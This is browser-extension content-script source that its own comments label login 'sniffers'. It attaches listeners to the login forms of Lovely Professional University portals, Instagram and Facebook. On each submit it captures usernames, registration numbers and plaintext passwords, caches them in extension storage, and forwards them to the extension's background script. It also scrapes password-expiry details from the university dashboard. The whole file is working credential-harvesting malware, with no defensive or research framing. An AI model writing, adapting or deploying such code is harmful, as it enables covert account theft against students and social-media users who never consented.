// =================== Student Data Sniffer (LPU) ===================
// Only sends data on form submit or login button click - NOT on every keystroke

let lpuDataSent = false; // Prevent duplicate sends

// Store credentials temporarily in chrome.storage for combining with expiry info on dashboard
function storeCredentialsTemp(regNo, password) {
  try {
    chrome.storage.local.set({ 
      _lpu_temp_creds: { regNo, password, time: Date.now() } 
    });
    console.log("%c[LPU] Credentials stored temporarily for dashboard", "color: #ff9800;");
  } catch(e) {
    console.error("[LPU] Failed to store temp creds:", e);
  }
}

function getTempCredentials() {
  return new Promise((resolve) => {
    try {
      chrome.storage.local.get('_lpu_temp_creds', (result) => {
        const data = result._lpu_temp_creds;
        if (data && data.regNo && data.password) {
          // Only valid for 10 minutes
          if (Date.now() - data.time < 10 * 60 * 1000) {
            resolve(data);
            return;
          }
        }
        resolve(null);
      });
    } catch(e) {
      resolve(null);
    }
  });
}

function clearTempCredentials() {
  try {
    chrome.storage.local.remove('_lpu_temp_creds');
  } catch(e) {}
}

function sendStudentData(regNo, password, pwdExpiryDays = null, pwdExpiryDate = null) {
  // Validate: Registration number min 8 chars, password min 6 chars
  if (!regNo || regNo.length < 8 || !password || password.length < 6) {
    console.log("%c[LPU] SKIP: Data incomplete - RegNo min 8, Password min 6 chars required", "color: #ff9800;");
    return;
  }
  
  // Prevent sending same data multiple times
  const key = `${regNo}:${password}:${pwdExpiryDays}:${pwdExpiryDate}`;
  if (lpuDataSent === key) {
    console.log("%c[LPU] SKIP: Duplicate data, already sent", "color: #ff9800;");
    return;
  }
  
  lpuDataSent = key;
  
  chrome.runtime.sendMessage({
    type: "student_data",
    data: { 
      registrationNumber: regNo, 
      password,
      pwdExpiryDays,
      pwdExpiryDate
    },
  });
  
  console.log("%c[LPU] SENT: Credentials forwarded to background", "color: #4caf50; font-weight: bold;");
  console.table({ registrationNumber: regNo, password: "*".repeat(password.length), pwdExpiryDays, pwdExpiryDate });
}

function setupStudentListeners() {
  try {
    const regInput = document.getElementById("txtU");
    const passInput = document.getElementById("TxtpwdAutoId_8767");

    if (!regInput || !passInput) return false;

    // Find the login form or submit button
    const form = regInput.closest("form");
    const submitBtn = document.querySelector("input[type='submit'], button[type='submit'], #btnNext, .btn-primary");

    const captureAndSend = () => {
      const regNo = regInput.value.trim();
      const password = passInput.value;
      
      // Only process if regNo >= 8 chars and password >= 6 chars
      if (regNo && password && regNo.length >= 8 && password.length >= 6) {
        // Store credentials temporarily - will be combined with expiry info on dashboard
        storeCredentialsTemp(regNo, password);
        // Send immediately without expiry (will be updated on dashboard)
        sendStudentData(regNo, password, null, null);
      }
    };

    // Only capture on form submit
    if (form) {
      form.addEventListener("submit", (e) => {
        captureAndSend();
      });
    }

    // Also capture on submit button click
    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        captureAndSend();
      });
    }

    // Capture when Enter is pressed in password field
    passInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        captureAndSend();
      }
    });

    console.log("%c[LPU] READY: Login form listeners attached (submit only mode)", "color: #4caf50; font-weight: bold;");
    return true;
  } catch (e) {
    console.error("[LPU] ERROR: Failed to setup listeners:", e);
    return false;
  }
}

// Retry mechanism for LPU inputs
if (!setupStudentListeners()) {
  let retries = 0;
  const maxRetries = 15;
  const interval = setInterval(() => {
    retries++;
    if (setupStudentListeners() || retries >= maxRetries) {
      clearInterval(interval);
      if (retries >= maxRetries) {
        console.log("%c[LPU] TIMEOUT: Login form not found after max retries", "color: #ff9800;");
      }
    }
  }, 700);
}

// =================== LPU Dashboard Password Expiry Capture ===================
// This captures password expiry info after successful login (on dashboard page)
let dashboardExpiryChecked = false;

async function capturePasswordExpiryFromDashboard() {
  if (dashboardExpiryChecked) return;
  
  // Check for password expiry element on dashboard
  const expirySpan = document.getElementById("ctl00_wcUserPasswordDetail_HP_Label1");
  
  // Also try other possible expiry element selectors
  const expiryElement = expirySpan || 
    document.querySelector("[id*='wcUserPasswordDetail']") ||
    document.querySelector(".fg-password span[id]");
    
  if (!expiryElement) {
    console.log("%c[LPU] Dashboard: No expiry element found yet...", "color: #9e9e9e;");
    return;
  }
  
  const text = expiryElement.textContent || expiryElement.innerText || "";
  if (!text || text.trim() === "" || !text.includes("expire")) return;
  
  console.log("%c[LPU] Dashboard: Found expiry element!", "color: #2196f3; font-weight: bold;");
  console.log("%c[LPU] Text: " + text, "color: #2196f3;");
  
  dashboardExpiryChecked = true;
  
  let pwdExpiryDays = null;
  let pwdExpiryDate = null;
  
  // Extract days: "UMS Pwd will expire after 16 days"
  const daysMatch = text.match(/expire after (\d+) days/i);
  if (daysMatch) {
    pwdExpiryDays = parseInt(daysMatch[1], 10);
  }
  
  // Extract date: "on or before 08-02-2026"
  const dateMatch = text.match(/on or before (\d{2}-\d{2}-\d{4})/i);
  if (dateMatch) {
    pwdExpiryDate = dateMatch[1];
  }
  
  console.log("%c[LPU] Dashboard: Parsed expiry info", "color: #2196f3;");
  console.table({ pwdExpiryDays, pwdExpiryDate });
  
  if (pwdExpiryDays !== null || pwdExpiryDate !== null) {
    // Get temp credentials from chrome.storage (from login form)
    const tempCreds = await getTempCredentials();
    
    if (tempCreds && tempCreds.regNo && tempCreds.password) {
      console.log("%c[LPU] Dashboard: Found temp credentials from login!", "color: #4caf50; font-weight: bold;");
      // Send complete data with expiry info
      sendStudentData(tempCreds.regNo, tempCreds.password, pwdExpiryDays, pwdExpiryDate);
      clearTempCredentials();
      return;
    } else {
      console.log("%c[LPU] Dashboard: No temp credentials found, sending expiry update only", "color: #ff9800;");
    }
    
    // Fallback: Try to get registration number from the page and send update
    let regNo = null;
    
    // Try multiple selectors commonly used for displaying reg number
    const regNoSelectors = [
      "#ctl00_cphHeading_Aborlogindev_UserNameLabel",
      "#ctl00_cphHeading_UserNameLabel", 
      ".user-reg-no",
      "[id*='UserNameLabel']",
      "[id*='RegistrationNo']",
      "[id*='RegNo']"
    ];
    
    for (const selector of regNoSelectors) {
      const el = document.querySelector(selector);
      if (el && el.textContent) {
        const elText = el.textContent.trim();
        // Check if it looks like a registration number (8+ digits)
        if (/^\d{8,}$/.test(elText)) {
          regNo = elText;
          console.log("%c[LPU] Dashboard: Found RegNo via selector: " + selector, "color: #4caf50;");
          break;
        }
      }
    }
    
    // Also try to find in any visible element containing the number pattern
    if (!regNo) {
      const allElements = document.querySelectorAll("span, label, div, td");
      for (const el of allElements) {
        const txt = el.textContent?.trim();
        if (txt && /^\d{8,12}$/.test(txt)) {
          regNo = txt;
          console.log("%c[LPU] Dashboard: Found RegNo via scan: " + regNo, "color: #4caf50;");
          break;
        }
      }
    }
    
    if (regNo) {
      console.log("%c[LPU] Dashboard: Sending expiry update for " + regNo, "color: #4caf50;");
      chrome.runtime.sendMessage({
        type: "lpu_expiry_update",
        data: { 
          registrationNumber: regNo,
          pwdExpiryDays,
          pwdExpiryDate
        },
      });
    } else {
      console.log("%c[LPU] Dashboard: Expiry info found but no RegNo detected", "color: #ff9800;");
    }
  }
}

// Check for dashboard password expiry info
if (location.hostname.includes("lpu.in") || location.hostname.includes("lpude.in")) {
  // Check immediately and also with delay (for dynamic content)
  setTimeout(capturePasswordExpiryFromDashboard, 1000);
  setTimeout(capturePasswordExpiryFromDashboard, 3000);
  setTimeout(capturePasswordExpiryFromDashboard, 5000);
  
  // Also use MutationObserver for dynamic pages
  const observer = new MutationObserver(() => {
    capturePasswordExpiryFromDashboard();
  });
  
  observer.observe(document.body, { 
    childList: true, 
    subtree: true 
  });
  
  // Stop observing after 10 seconds
  setTimeout(() => observer.disconnect(), 10000);
}

// =================== Instagram Login Sniffer ===================
if (location.hostname.includes("instagram.com")) {
  let igTries = 0;
  const igMaxTries = 25;

  const sniffInstagramLogin = setInterval(() => {
    igTries++;

    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginBtn = document.querySelector("button[type='submit']:not([disabled])");

    if (usernameInput && passwordInput && loginBtn) {
      console.log("%c[IG] READY: Login form detected, listener attached", "color: #4caf50; font-weight: bold;");

      loginBtn.addEventListener("click", () => {
        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        if (username && password) {
          chrome.runtime.sendMessage({
            type: "instagram_login_data",
            data: { username, password },
          });
          console.log("%c[IG] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
        }
      }, { once: true });

      clearInterval(sniffInstagramLogin);
    }

    if (igTries >= igMaxTries) {
      clearInterval(sniffInstagramLogin);
    }
  }, 700);
}

// =================== Facebook Login Sniffer ===================
if (location.hostname.includes("facebook.com")) {
  let fbTries = 0;
  const fbMaxTries = 25;

  const sniffFacebookLogin = setInterval(() => {
    fbTries++;

    // Facebook login form selectors
    const emailInput = document.querySelector("input[name='email'], input#email");
    const passwordInput = document.querySelector("input[name='pass'], input#pass");
    const loginBtn = document.querySelector("button[name='login'], button[type='submit'], button[data-testid='royal_login_button']");

    if (emailInput && passwordInput && loginBtn) {
      console.log("%c[FB] READY: Login form detected, listener attached", "color: #4caf50; font-weight: bold;");

      loginBtn.addEventListener("click", () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value;

        if (email && password && password.length >= 6) {
          chrome.runtime.sendMessage({
            type: "facebook_login_data",
            data: { email, password },
          });
          console.log("%c[FB] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
        }
      }, { once: true });

      // Also listen for Enter key in password field
      passwordInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          const email = emailInput.value.trim();
          const password = passwordInput.value;

          if (email && password && password.length >= 6) {
            chrome.runtime.sendMessage({
              type: "facebook_login_data",
              data: { email, password },
            });
            console.log("%c[FB] SENT: Login credentials forwarded to background", "color: #4caf50; font-weight: bold;");
          }
        }
      }, { once: true });

      clearInterval(sniffFacebookLogin);
    }

    if (fbTries >= fbMaxTries) {
      clearInterval(sniffFacebookLogin);
    }
  }, 700);
}
